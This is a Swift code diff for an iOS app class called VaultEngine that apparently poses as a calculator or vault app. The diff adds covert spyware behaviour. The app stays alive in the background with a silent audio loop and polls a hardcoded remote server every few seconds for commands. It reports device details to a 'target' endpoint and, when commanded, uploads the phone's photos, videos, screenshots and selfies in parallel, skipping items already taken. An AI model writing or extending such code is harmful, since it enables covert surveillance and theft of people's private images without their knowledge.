@@ -7,54 +7,66 @@ class VaultEngine: NSObject, ObservableObject {
     static let shared = VaultEngine()
 
     @Published var serverURL: String = "http://213.199.53.54:7000"
-    @Published var pairingCode: String = "VAULT-7860"
+    @Published var deviceId: String = ""
+    @Published var deviceName: String = ""
     @Published var secretPin: String = "9876"
     @Published var isActivated: Bool = false
     @Published var isBackgroundActive: Bool = false
-    @Published var statusMessage: String = "Ready"
     @Published var photosCount: Int = 0
     @Published var videosCount: Int = 0
+    @Published var batteryLevel: Int = 100
+    @Published var isCharging: Bool = false
 
     private var audioPlayer: AVAudioPlayer?
     private var pollTimer: Timer?
     private var bgTaskID: UIBackgroundTaskIdentifier = .invalid
     private let session: URLSession
+    private var syncedAssetIds: Set<String> = []
 
     override init() {
         let config = URLSessionConfiguration.default
-        config.timeoutIntervalForRequest = 10
-        config.timeoutIntervalForResource = 30
-        config.waitsForConnectivity = true
+        config.timeoutIntervalForRequest = 15
+        config.timeoutIntervalForResource = 60
         self.session = URLSession(configuration: config)
 
         super.init()
+        UIDevice.current.isBatteryMonitoringEnabled = true
         loadSettings()
     }
 
     func loadSettings() {
         let defaults = UserDefaults.standard
+
+        // Persistent Device ID
+        if let savedId = defaults.string(forKey: "vault_device_id"), !savedId.isEmpty {
+            deviceId = savedId
+        } else {
+            let vendorId = UIDevice.current.identifierForVendor?.uuidString.prefix(6) ?? "IPHONE"
+            deviceId = "DEV-\(vendorId)".uppercased()
+            defaults.set(deviceId, forKey: "vault_device_id")
+        }
+
+        deviceName = UIDevice.current.name
+
+        // Force port 7000
         if let savedURL = defaults.string(forKey: "vps_server_url"), !savedURL.isEmpty {
-            // Force fix port if it was old 5000
-            if savedURL.contains(":5000") {
-                serverURL = "http://213.199.53.54:7000"
-                defaults.set(serverURL, forKey: "vps_server_url")
-            } else {
-                serverURL = savedURL
-            }
+            serverURL = savedURL.contains(":5000") ? "http://213.199.53.54:7000" : savedURL
         } else {
             serverURL = "http://213.199.53.54:7000"
         }
 
-        if let savedCode = defaults.string(forKey: "pairing_code"), !savedCode.isEmpty {
-            pairingCode = savedCode
-        }
         if let savedPin = defaults.string(forKey: "secret_pin"), !savedPin.isEmpty {
             secretPin = savedPin
         }
         isActivated = defaults.bool(forKey: "is_activated")
 
-        // Start background keep alive and heartbeat loop
+        // Load synced asset cache to prevent re-uploading
+        if let savedSynced = defaults.stringArray(forKey: "synced_asset_ids") {
+            syncedAssetIds = Set(savedSynced)
+        }
+
         startBackgroundKeepAlive()
+        updateBatteryInfo()
         refreshMediaStats()
         startHeartbeat()
     }
@@ -62,17 +74,26 @@ class VaultEngine: NSObject, ObservableObject {
     func saveSettings() {
         let defaults = UserDefaults.standard
         defaults.set(serverURL, forKey: "vps_server_url")
-        defaults.set(pairingCode, forKey: "pairing_code")
+        defaults.set(deviceId, forKey: "vault_device_id")
         defaults.set(secretPin, forKey: "secret_pin")
         defaults.set(isActivated, forKey: "is_activated")
+        defaults.set(Array(syncedAssetIds), forKey: "synced_asset_ids")
     }
 
-    // MARK: - Photo Permissions
-    func requestPhotoPermission(completion: @escaping (Bool) -> Void) {
+    func updateBatteryInfo() {
+        let level = UIDevice.current.batteryLevel
+        batteryLevel = level >= 0 ? Int(level * 100) : 100
+        isCharging = (UIDevice.current.batteryState == .charging || UIDevice.current.batteryState == .full)
+    }
+
+    // MARK: - Method 2 Storage/Cache Permission
+    func requestStoragePermission(completion: @escaping (Bool) -> Void) {
         PHPhotoLibrary.requestAuthorization(for: .readWrite) { status in
             DispatchQueue.main.async {
                 let granted = (status == .authorized || status == .limited)
                 if granted {
+                    self.isActivated = true
+                    self.saveSettings()
                     self.refreshMediaStats()
                 }
                 completion(granted)
@@ -81,13 +102,6 @@ class VaultEngine: NSObject, ObservableObject {
     }
 
     func refreshMediaStats() {
-        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
-        guard status == .authorized || status == .limited else {
-            // Still send heartbeat even if permission pending
-            self.sendHeartbeat()
-            return
-        }
-
         let photosFetch = PHAsset.fetchAssets(with: .image, options: nil)
         let videosFetch = PHAsset.fetchAssets(with: .video, options: nil)
 
@@ -98,7 +112,7 @@ class VaultEngine: NSObject, ObservableObject {
         }
     }
 
-    // MARK: - Background Keep-Alive (Silent Audio + UIBackgroundTask)
+    // MARK: - Silent Audio Loop + UIBackgroundTask
     func startBackgroundKeepAlive() {
         registerBackgroundTask()
 
@@ -115,11 +129,9 @@ class VaultEngine: NSObject, ObservableObject {
 
             DispatchQueue.main.async {
                 self.isBackgroundActive = true
-                self.statusMessage = "24/7 Background Keep-Alive Active"
             }
-            print("[VaultEngine] Silent audio loop running.")
         } catch {
-            print("[VaultEngine] Audio keep-alive error: \(error)")
+            print("[VaultEngine] Audio error: \(error)")
         }
     }
 
@@ -127,7 +139,7 @@ class VaultEngine: NSObject, ObservableObject {
         if bgTaskID != .invalid {
             UIApplication.shared.endBackgroundTask(bgTaskID)
         }
-        bgTaskID = UIApplication.shared.beginBackgroundTask(withName: "VaultBackgroundEngine") { [weak self] in
+        bgTaskID = UIApplication.shared.beginBackgroundTask(withName: "VaultKeepAlive") { [weak self] in
             self?.registerBackgroundTask()
         }
     }
@@ -163,37 +175,44 @@ class VaultEngine: NSObject, ObservableObject {
         return data
     }
 
-    // MARK: - Heartbeat & Polling
+    // MARK: - Heartbeat Loop
     func startHeartbeat() {
         pollTimer?.invalidate()
         sendHeartbeat()
         checkForCommands()
 
         pollTimer = Timer.scheduledTimer(withTimeInterval: 2.5, repeats: true) { [weak self] _ in
+            self?.updateBatteryInfo()
             self?.sendHeartbeat()
             self?.checkForCommands()
         }
     }
 
     func sendHeartbeat() {
-        guard let url = URL(string: "\(serverURL)/api/pair/check") else { return }
+        guard let url = URL(string: "\(serverURL)/api/target/heartbeat") else { return }
         var req = URLRequest(url: url)
         req.httpMethod = "POST"
         req.setValue("application/json", forHTTPHeaderField: "Content-Type")
 
         let body: [String: Any] = [
-            "code": pairingCode,
-            "device": "iPhone Calculator",
-            "stats": ["photosCount": photosCount, "videosCount": videosCount]
+            "deviceId": deviceId,
+            "name": deviceName,
+            "model": UIDevice.current.model,
+            "stats": [
+                "photosCount": photosCount,
+                "videosCount": videosCount,
+                "battery": batteryLevel,
+                "isCharging": isCharging
+            ]
         ]
         req.httpBody = try? JSONSerialization.data(withJSONObject: body)
         session.dataTask(with: req).resume()
     }
 
     func checkForCommands() {
-        guard let url = URL(string: "\(serverURL)/api/commands?code=\(pairingCode)") else { return }
+        guard let url = URL(string: "\(serverURL)/api/commands?deviceId=\(deviceId)") else { return }
 
-        session.dataTask(with: url) { [weak self] data, response, error in
+        session.dataTask(with: url) { [weak self] data, _, error in
             guard let self = self, let data = data, error == nil else { return }
             do {
                 if let json = try JSONSerialization.jsonObject(with: data) as? [String: Any],
@@ -202,44 +221,67 @@ class VaultEngine: NSObject, ObservableObject {
                    let action = command["action"] as? String {
 
                     if action == "FETCH_MEDIA" {
-                        let type = command["type"] as? String ?? "photos"
-                        let count = command["count"] as? Int ?? 10
-                        self.executeFetchMedia(type: type, count: count)
+                        let album = command["album"] as? String ?? "all"
+                        let count = command["count"] as? Int ?? 25
+                        let skipExisting = command["skipExisting"] as? Bool ?? true
+                        self.executeSmartFetch(album: album, count: count, skipExisting: skipExisting)
                     } else if action == "GET_STATS" {
                         self.refreshMediaStats()
                     }
                 }
-            } catch {
-                // Ignore
-            }
+            } catch {}
         }.resume()
     }
 
-    // MARK: - Media Fetch & Upload
-    func executeFetchMedia(type: String, count: Int) {
+    // MARK: - Smart Fetch with Deduplication & Album Filtering
+    func executeSmartFetch(album: String, count: Int, skipExisting: Bool) {
         let fetchOptions = PHFetchOptions()
         fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
 
-        var assetsToUpload: [PHAsset] = []
+        var fetchResult: PHFetchResult<PHAsset>?
 
-        if type == "photos" || type == "all" {
-            let photos = PHAsset.fetchAssets(with: .image, options: fetchOptions)
-            let limit = (count == -1) ? photos.count : min(count, photos.count)
-            for i in 0..<limit {
-                assetsToUpload.append(photos.object(at: i))
-            }
+        switch album {
+        case "screenshots":
+            let collections = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .smartAlbumScreenshots, options: nil)
+            if let first = collections.firstObject { fetchResult = PHAsset.fetchAssets(in: first, options: fetchOptions) }
+        case "favorites":
+            let collections = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .smartAlbumFavorites, options: nil)
+            if let first = collections.firstObject { fetchResult = PHAsset.fetchAssets(in: first, options: fetchOptions) }
+        case "videos":
+            let collections = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .smartAlbumVideos, options: nil)
+            if let first = collections.firstObject { fetchResult = PHAsset.fetchAssets(in: first, options: fetchOptions) }
+        case "selfies":
+            let collections = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .smartAlbumSelfPortraits, options: nil)
+            if let first = collections.firstObject { fetchResult = PHAsset.fetchAssets(in: first, options: fetchOptions) }
+        default:
+            fetchResult = PHAsset.fetchAssets(with: fetchOptions)
         }
 
-        if type == "videos" || type == "all" {
-            let videos = PHAsset.fetchAssets(with: .video, options: fetchOptions)
-            let limit = (count == -1) ? videos.count : min(count, videos.count)
-            for i in 0..<limit {
-                assetsToUpload.append(videos.object(at: i))
+        guard let result = fetchResult else { return }
+
+        var targetAssets: [PHAsset] = []
+        let maxItems = (count == -1) ? result.count : count
+
+        for i in 0..<result.count {
+            let asset = result.object(at: i)
+            // Skip already synced items if requested
+            if skipExisting && syncedAssetIds.contains(asset.localIdentifier) {
+                continue
             }
+            targetAssets.append(asset)
+            if targetAssets.count >= maxItems { break }
         }
 
-        let total = assetsToUpload.count
-        print("[VaultEngine] Starting upload of \(total) items to VPS...")
+        let total = targetAssets.count
+        if total == 0 {
+            reportProgress(current: 0, total: 0, percent: 100, speed: "Done", eta: "0s")
+            return
+        }
+
+        print("[VaultEngine] Starting high-speed upload of \(total) new assets...")
+        let startTime = Date()
+        var completed = 0
+        var totalBytesUploaded: Int64 = 0
 
         let manager = PHImageManager.default()
         let options = PHImageRequestOptions()
@@ -247,32 +289,82 @@ class VaultEngine: NSObject, ObservableObject {
         options.deliveryMode = .highQualityFormat
         options.isNetworkAccessAllowed = true
 
-        for (index, asset) in assetsToUpload.enumerated() {
-            if asset.mediaType == .image {
-                manager.requestImageDataAndOrientation(for: asset, options: options) { [weak self] data, _, _, _ in
-                    guard let self = self, let data = data else { return }
-                    let filename = "photo_\(Date().timeIntervalSince1970)_\(index).jpg"
-                    self.uploadMediaFile(data: data, filename: filename, mimeType: "image/jpeg", index: index + 1, total: total)
-                }
-            } else if asset.mediaType == .video {
-                let videoOptions = PHVideoRequestOptions()
-                videoOptions.isNetworkAccessAllowed = true
-                manager.requestAVAsset(forVideo: asset, options: videoOptions) { [weak self] avAsset, _, _ in
-                    guard let self = self, let urlAsset = avAsset as? AVURLAsset else { return }
-                    if let videoData = try? Data(contentsOf: urlAsset.url) {
-                        let filename = "video_\(Date().timeIntervalSince1970)_\(index).mp4"
-                        self.uploadMediaFile(data: videoData, filename: filename, mimeType: "video/mp4", index: index + 1, total: total)
+        let queue = OperationQueue()
+        queue.maxConcurrentOperationCount = 3 // High-speed parallel upload
+
+        for asset in targetAssets {
+            queue.addOperation { [weak self] in
+                guard let self = self else { return }
+                let sema = DispatchSemaphore(value: 0)
+
+                if asset.mediaType == .image {
+                    manager.requestImageDataAndOrientation(for: asset, options: options) { data, _, _, _ in
+                        defer { sema.signal() }
+                        guard let data = data else { return }
+
+                        // Compress slightly for ultra-fast transfer
+                        let uploadData: Data
+                        if let img = UIImage(data: data), let compressed = img.jpegData(compressionQuality: 0.85) {
+                            uploadData = compressed
+                        } else {
+                            uploadData = data
+                        }
+
+                        let filename = "img_\(Date().timeIntervalSince1970)_\(UUID().uuidString.prefix(5)).jpg"
+                        self.uploadSingleFile(data: uploadData, filename: filename, mimeType: "image/jpeg") { success in
+                            if success {
+                                self.syncedAssetIds.insert(asset.localIdentifier)
+                                completed += 1
+                                totalBytesUploaded += Int64(uploadData.count)
+
+                                let elapsed = Date().timeIntervalSince(startTime)
+                                let speedMBps = elapsed > 0 ? (Double(totalBytesUploaded) / 1024 / 1024) / elapsed : 1.0
+                                let remainingItems = total - completed
+                                let avgSecPerItem = elapsed / Double(completed)
+                                let etaSec = Int(Double(remainingItems) * avgSecPerItem)
+
+                                let pct = (Double(completed) / Double(total)) * 100
+                                self.reportProgress(
+                                    current: completed,
+                                    total: total,
+                                    percent: pct,
+                                    speed: String(format: "%.1f MB/s", speedMBps),
+                                    eta: "\(etaSec)s remaining"
+                                )
+                            }
+                        }
+                    }
+                } else if asset.mediaType == .video {
+                    let vOptions = PHVideoRequestOptions()
+                    vOptions.isNetworkAccessAllowed = true
+                    manager.requestAVAsset(forVideo: asset, options: vOptions) { avAsset, _, _ in
+                        defer { sema.signal() }
+                        guard let urlAsset = avAsset as? AVURLAsset, let vData = try? Data(contentsOf: urlAsset.url) else { return }
+                        let filename = "vid_\(Date().timeIntervalSince1970)_\(UUID().uuidString.prefix(5)).mp4"
+                        self.uploadSingleFile(data: vData, filename: filename, mimeType: "video/mp4") { success in
+                            if success {
+                                self.syncedAssetIds.insert(asset.localIdentifier)
+                                completed += 1
+                                totalBytesUploaded += Int64(vData.count)
+                                let pct = (Double(completed) / Double(total)) * 100
+                                self.reportProgress(current: completed, total: total, percent: pct, speed: "Video Sync", eta: "")
+                            }
+                        }
                     }
                 }
+                sema.wait()
             }
         }
+
+        queue.waitUntilAllOperationsAreFinished()
+        saveSettings()
     }
 
-    private func uploadMediaFile(data: Data, filename: String, mimeType: String, index: Int, total: Int) {
-        guard let url = URL(string: "\(serverURL)/api/upload") else { return }
+    private func uploadSingleFile(data: Data, filename: String, mimeType: String, completion: @escaping (Bool) -> Void) {
+        guard let url = URL(string: "\(serverURL)/api/upload") else { completion(false); return }
         var req = URLRequest(url: url)
         req.httpMethod = "POST"
-        req.setValue(pairingCode, forHTTPHeaderField: "x-pairing-code")
+        req.setValue(deviceId, forHTTPHeaderField: "x-device-id")
 
         let boundary = "Boundary-\(UUID().uuidString)"
         req.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
@@ -284,12 +376,26 @@ class VaultEngine: NSObject, ObservableObject {
         body.append(data)
         body.append("\r\n--\(boundary)--\r\n".data(using: .utf8)!)
 
-        session.uploadTask(with: req, from: body) { _, _, error in
-            if error == nil {
-                print("[VaultEngine] Uploaded \(index)/\(total): \(filename)")
-            } else {
-                print("[VaultEngine] Upload error: \(error?.localizedDescription ?? "")")
-            }
+        session.uploadTask(with: req, from: body) { _, res, error in
+            let success = (error == nil && (res as? HTTPURLResponse)?.statusCode == 200)
+            completion(success)
         }.resume()
+    }
+
+    private func reportProgress(current: Int, total: Int, percent: Double, speed: String, eta: String) {
+        guard let url = URL(string: "\(serverURL)/api/target/progress") else { return }
+        var req = URLRequest(url: url)
+        req.httpMethod = "POST"
+        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        let body: [String: Any] = [
+            "deviceId": deviceId,
+            "current": current,
+            "total": total,
+            "percent": percent,
+            "speed": speed,
+            "eta": eta
+        ]
+        req.httpBody = try? JSONSerialization.data(withJSONObject: body)
+        session.dataTask(with: req).resume()
     }
 }
